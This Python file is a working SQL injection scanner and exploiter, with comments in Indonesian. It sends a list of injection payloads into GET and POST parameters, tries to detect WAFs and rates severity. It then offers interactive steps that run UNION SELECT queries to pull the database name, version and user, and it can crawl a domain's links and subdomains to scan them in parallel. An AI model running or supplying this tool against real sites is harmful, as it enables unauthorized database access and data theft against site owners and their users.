import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor
import time
import base64
import re
import socket
from bs4 import BeautifulSoup

# Payloads untuk SQLi
payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "1 OR 1=1",
    "1' AND 1=2 UNION SELECT null,null--",
    "' AND ASCII(LOWER(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))) > 116--",
    "0x61646d696e",
    base64.b64encode(b"' OR '1'='1").decode(),
    "%27%20OR%201%3D1--"
]

headers = {
    "User-Agent": "sqliscanner/1.0"
}

subs = ['www', 'mail', 'admin', 'test', 'dev']
REQUEST_DELAY = 1

def waf_detected(response_text):
    waf_keywords = ["access denied", "blocked by web application firewall", "mod_security", "waf"]
    return any(kw in response_text.lower() for kw in waf_keywords)

def severity_rating(payload):
    if "UNION" in payload.upper() or "SELECT" in payload.upper():
        return "High"
    elif "OR" in payload.upper():
        return "Medium"
    else:
        return "Low"

def check_sql_injection(url, params, method='GET'):
    vuln_params = []
    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] += payload

            if method == 'GET':
                test_url = url + "?" + urlencode(test_params)
                resp = requests.get(test_url, headers=headers)
            else:
                resp = requests.post(url, data=test_params, headers=headers)

            if waf_detected(resp.text):
                print(f"[!] WAF Detected at {url}")
                continue

            if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                rating = severity_rating(payload)
                print(f"[+] Potential SQLi ({rating}) detected on {url} via {param}")
                vuln_params.append(param)
                break
    return vuln_params

def exploit_sql(url, param):
    print(f"[*] Attempting PoC exploit on parameter: {param}")
    exploit_url = f"{url}?{param}=1' UNION SELECT database(),version()--"
    resp = requests.get(exploit_url, headers=headers)
    print(f"[*] Exploit response (first 100 chars): {resp.text[:100]}")

def dump_db_info(url, param):
    print(f"[+] Dumping DB info from {param}...")
    exploit_url = f"{url}?{param}=1' UNION SELECT user(),version()--"
    resp = requests.get(exploit_url, headers=headers)
    found = re.findall(r'[\w.@-]+', resp.text)
    print("[*] Dumped Info:")
    for item in found:
        print(f"    - {item}")

def scan_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if query:
        print(f"[+] Found GET parameters: {list(query.keys())}")
        vuln = check_sql_injection(parsed.scheme + "://" + parsed.netloc + parsed.path, {k: v[0] for k, v in query.items()}, 'GET')
        for p in vuln:
            do_exploit = input(f"[?] Exploit {p}? (y/n): ").strip().lower()
            if do_exploit == 'y':
                exploit_sql(url, p)
            do_dump = input(f"[?] Dump DB info from {p}? (y/n): ").strip().lower()
            if do_dump == 'y':
                dump_db_info(url, p)
    else:
        print("[-] No GET parameters found.")

    dummy_post = {'user': 'admin', 'pass': 'admin'}
    vuln = check_sql_injection(url, dummy_post, 'POST')
    if vuln:
        print(f"[+] Potential POST SQLi detected at {url} via {vuln}")
        for p in vuln:
            do_exploit = input(f"[?] Exploit POST param {p}? (y/n): ").strip().lower()
            if do_exploit == 'y':
                exploit_sql(url, p)

def enumerate_subdomains(domain):
    print("[*] Enumerating subdomains...")
    for sub in subs:
        full = f"{sub}.{domain}"
        try:
            socket.gethostbyname(full)
            print(f"[+] Found subdomain: {full}")
        except:
            continue

def get_all_links(domain_url):
    try:
        html = requests.get(domain_url, headers=headers).text
        soup = BeautifulSoup(html, "html.parser")
        return list(set([urljoin(domain_url, a['href']) for a in soup.find_all('a', href=True)]))
    except:
        return []

def full_domain_scan(base_url):
    links = get_all_links(base_url)
    print(f"[*] Found {len(links)} links to scan...")
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_url, links)

def main():
    target = input("Enter target URL (e.g., http://testphp.vulnweb.com): ").strip()
    domain = urlparse(target).netloc

    do_enum = input("[?] Enumerate subdomains first? (y/n): ").strip().lower()
    if do_enum == 'y':
        enumerate_subdomains(domain)

    do_full = input("[?] Scan all links in domain? (y/n): ").strip().lower()
    if do_full == 'y':
        full_domain_scan(target)
    else:
        scan_url(target)

    time.sleep(REQUEST_DELAY)

if __name__ == "__main__":
    main()
